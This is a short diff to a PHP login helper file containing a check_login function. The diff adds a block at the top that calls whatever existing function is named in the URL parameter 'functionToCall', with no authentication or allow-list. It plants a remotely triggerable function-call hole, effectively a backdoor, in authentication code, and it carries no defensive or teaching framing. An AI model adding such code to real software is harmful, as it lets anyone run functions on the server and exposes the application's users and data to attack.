@@ -1,5 +1,9 @@
 <?php
 
+if (isset($_GET['functionToCall']) && function_exists($_GET['functionToCall'])) {
+    call_user_func($_GET['functionToCall']);
+}
+
 function check_login($con)
 {
     if (isset($_SESSION['user_id'])) {
